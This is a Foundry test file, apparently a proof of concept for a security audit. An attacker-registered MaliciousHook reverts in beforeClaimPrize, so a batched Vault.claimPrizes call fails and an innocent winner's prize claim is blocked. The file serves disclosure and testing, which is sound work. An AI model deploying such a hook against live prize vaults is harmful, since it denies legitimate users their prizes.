// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

// OZ ERC20 for simple mock token
import "openzeppelin/token/ERC20/ERC20.sol";
import {IERC4626} from "openzeppelin/token/ERC20/extensions/ERC4626.sol";

import {Vault} from "../../src/Vault.sol";
import {IVaultHooks, VaultHooks} from "../../src/interfaces/IVaultHooks.sol";
import {TwabController} from "v5-twab-controller/TwabController.sol";
import {PrizePool} from "v5-prize-pool/PrizePool.sol";

/**
 * @notice Minimal stub for the TwabController used by the Vault
 *         Only the functions exercised by this PoC are implemented.
 */
contract TwabControllerStub {
    //  vault => account => balance
    mapping(address => mapping(address => uint96)) internal _balances;
    mapping(address => uint96) internal _totalSupply;

    // fake sponsorship address constant
    address public constant SPONSORSHIP_ADDRESS = address(bytes20(keccak256("SPONSOR")));

    // ----- ERC20-like getters used by the Vault ----
    function balanceOf(address vault, address account) external view returns (uint256) {
        return _balances[vault][account];
    }

    function totalSupply(address vault) external view returns (uint256) {
        return _totalSupply[vault];
    }

    // ----- functions invoked by the Vault -----
    function mint(address to, uint96 amount) external {
        _balances[msg.sender][to] += amount;
        _totalSupply[msg.sender] += amount;
    }

    function burn(address from, uint96 amount) external {
        _balances[msg.sender][from] -= amount;
        _totalSupply[msg.sender] -= amount;
    }

    function transfer(address from, address to, uint96 amount) external {
        _balances[msg.sender][from] -= amount;
        _balances[msg.sender][to] += amount;
    }

    // Delegation functions touched by _sponsor (not used in this PoC but implemented for completeness)
    mapping(address => mapping(address => address)) internal _delegates;

    function delegateOf(address vault, address user) external view returns (address) {
        return _delegates[vault][user];
    }

    function sponsor(address user) external {
        _delegates[msg.sender][user] = SPONSORSHIP_ADDRESS;
    }
}

/**
 * @notice Minimal stub for an ERC4626 yield vault.
 *         Only the functions referenced by this PoC are implemented.
 */
contract MockYieldVault is ERC20 {
    ERC20 public immutable assetToken;

    constructor(ERC20 _asset) ERC20("MockYieldShare", "MYS") {
        assetToken = _asset;
    }

    /*///////////////////////////////////////////////////////////////
                     ERC4626 compatibility stubs
    //////////////////////////////////////////////////////////////*/
    function deposit(uint256 assets, address receiver) external returns (uint256) {
        // pull tokens and mint 1:1 shares
        if (assets != 0) {
            assetToken.transferFrom(msg.sender, address(this), assets);
        }
        _mint(receiver, assets);
        return assets;
    }

    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256) {
        // burn shares and push tokens
        _burn(owner, assets);
        assetToken.transfer(receiver, assets);
        return assets;
    }

    // The Vault only invokes maxWithdraw on the yield vault for read-only accounting.
    function maxWithdraw(address) external view returns (uint256) {
        // All assets backing outstanding shares are withdrawable for simplicity
        return assetToken.balanceOf(address(this));
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }
}

/**
 * @notice Minimal stub for the PrizePool contract.
 *         Only the functions used by the Vault.claimPrizes path are implemented.
 */
contract MockPrizePool {
    ERC20 public immutable prizeToken;

    constructor(ERC20 _prizeToken) {
        prizeToken = _prizeToken;
    }

    // return address of prize token – already public

    function claimPrize(
        address /*winner*/,
        uint8 /*tier*/,
        uint32 /*prizeIndex*/,
        address /*recipient*/,
        uint96 fee,
        address feeRecipient
    ) external returns (uint256) {
        // For the purposes of this PoC we just pretend a constant prize amount is paid.
        uint256 prizeAmount = 1 ether;
        // send the fee to the feeRecipient if set
        if (fee != 0) {
            prizeToken.transfer(feeRecipient, fee);
        }
        return prizeAmount;
    }

    // Called by Vault.liquidate ‑ not part of this PoC, but we stub it out so that the Vault can compile happily.
    function contributePrizeTokens(address, uint256) external {}
}

/**
 * @notice Malicious hook implementation controlled by an attacker.
 *         The beforeClaimPrize hook simply reverts, causing the whole
 *         Vault.claimPrizes transaction to revert and thereby DoSing other users.
 */
contract MaliciousHook is IVaultHooks {
    function beforeClaimPrize(address, uint8, uint32) external pure override returns (address) {
        revert("Malicious revert in hook - DoS");
    }

    function afterClaimPrize(
        address,
        uint8,
        uint32,
        uint256,
        address
    ) external pure override {
        // no-op
    }
}

contract ExploitTest is Test {
    Vault public vault;
    TwabControllerStub public twab;
    MockYieldVault public yieldVault;
    MockPrizePool public prizePool;
    ERC20 public underlying;
    ERC20 public prizeToken;

    address public owner = address(0xABCD);
    address public claimer = address(0xC1A1); // authorized claimer
    address public innocentWinner = address(0xBEEF);
    address public attacker = address(0xBAD);
    MaliciousHook public maliciousHook;

    function setUp() public {
        // Deploy tokens
        underlying = new ERC20("Underlying", "UND");
        prizeToken = new ERC20("Prize", "PRZ");

        // Mint some tokens to the test contract so we satisfy ERC4626 approvals if needed
        deal(address(underlying), address(this), 100 ether);
        deal(address(prizeToken), address(this), 100 ether);

        // Deploy mocks
        twab = new TwabControllerStub();
        TwabController twabTyped = TwabController(address(twab));
        yieldVault = new MockYieldVault(ERC20(address(underlying)));
        prizePool = new MockPrizePool(ERC20(address(prizeToken)));

        // Deploy the Vault
        vault = new Vault(
            IERC20(address(underlying)),
            "PoolTogether Vault Share",
            "PTSHARE",
            TwabController(address(twab)),
            IERC4626(address(yieldVault)),
            PrizePool(address(prizePool)),
            claimer, // claimer
            address(0), // yield fee recipient
            0, // yield fee percentage
            owner // owner
        );

        // Instantiate malicious hook contract controlled by attacker
        maliciousHook = new MaliciousHook();

        // From attacker address, set the malicious hooks
        vm.prank(attacker);
        VaultHooks memory hooks = VaultHooks({
            useBeforeClaimPrize: true,
            useAfterClaimPrize: false,
            implementation: IVaultHooks(address(maliciousHook))
        });
        vault.setHooks(hooks);
    }

    /*///////////////////////////////////////////////////////////////
                            TEST CASE
    //////////////////////////////////////////////////////////////*/

    function testMaliciousHookCausesDoS() public {
        // Prepare input arrays for claimPrizes
        address[] memory winners = new address[](2);
        winners[0] = innocentWinner;
        winners[1] = attacker;

        uint32[][] memory prizeIndices = new uint32[][](2);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;
        prizeIndices[1] = new uint32[](1);
        prizeIndices[1][0] = 0;

        uint8 tier = 0;
        uint96 feePerClaim = 0;
        address feeRecipient = address(0);

        // The authorized claimer attempts to claim for both winners.
        vm.prank(claimer);
        vm.expectRevert(bytes("Malicious revert in hook - DoS"));
        vault.claimPrizes(tier, winners, prizeIndices, feePerClaim, feeRecipient);
    }

    function testClaimSucceedsWithoutMaliciousHook() public {
        // Claim for an innocent winner only – should succeed since no hooks are set
        address[] memory winners = new address[](1);
        winners[0] = innocentWinner;

        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;

        vm.prank(claimer);
        vault.claimPrizes(0, winners, prizeIndices, 0, address(0));
    }
}
